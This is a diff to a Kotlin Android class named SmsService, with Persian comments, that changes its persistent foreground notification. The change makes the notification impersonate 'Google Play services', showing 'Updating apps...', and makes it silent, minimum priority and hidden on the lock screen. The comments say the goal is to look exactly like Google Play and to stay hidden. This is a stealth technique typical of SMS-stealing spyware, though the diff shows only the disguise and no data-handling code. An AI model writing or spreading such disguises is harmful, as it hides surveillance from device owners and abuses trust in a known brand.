@@ -62,28 +62,31 @@ class SmsService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "System Services",  // ⭐ اسم کلی‌تر
-                NotificationManager.IMPORTANCE_LOW
+                "Google Play services",  // ⭐ شبیه Google Play
+                NotificationManager.IMPORTANCE_MIN  // ⭐ MIN برای مخفی بودن
             ).apply {
-                description = "Background system services"
-                setShowBadge(false)
+                description = "Google Play services keeps your apps up to date"
+                setShowBadge(false)  // بدون Badge
                 enableLights(false)
                 enableVibration(false)
-                setSound(null, null)
+                setSound(null, null)  // بدون صدا
+                lockscreenVisibility = Notification.VISIBILITY_SECRET  // مخفی در Lock Screen
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager?.createNotificationChannel(channel)
         }
 
-        // ⭐ نوتیفیکیشن شبیه Google Play
+        // ⭐ نوتیفیکیشن عیناً شبیه Google Play
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Update")  // 👈 هوشمندانه!
-            .setContentText("Checking for updates...")
-            .setSmallIcon(android.R.drawable.stat_sys_download)  // آیکون دانلود
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setOngoing(true)  // نمیشه dismiss کرد
-            .setShowWhen(false)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // مخفی در Lock Screen
+            .setContentTitle("Google Play services")
+            .setContentText("Updating apps...")
+            .setSmallIcon(android.R.drawable.stat_sys_download)  // آیکون دانلود سیستمی
+            .setPriority(NotificationCompat.PRIORITY_MIN)  // کمترین اولویت
+            .setOngoing(true)  // نمیشه بست
+            .setShowWhen(false)  // بدون زمان
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // مخفی
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)  // کتگوری سرویس
+            .setSilent(true)  // بدون صدا
             .build()
 
         startForeground(NOTIFICATION_ID, notification)
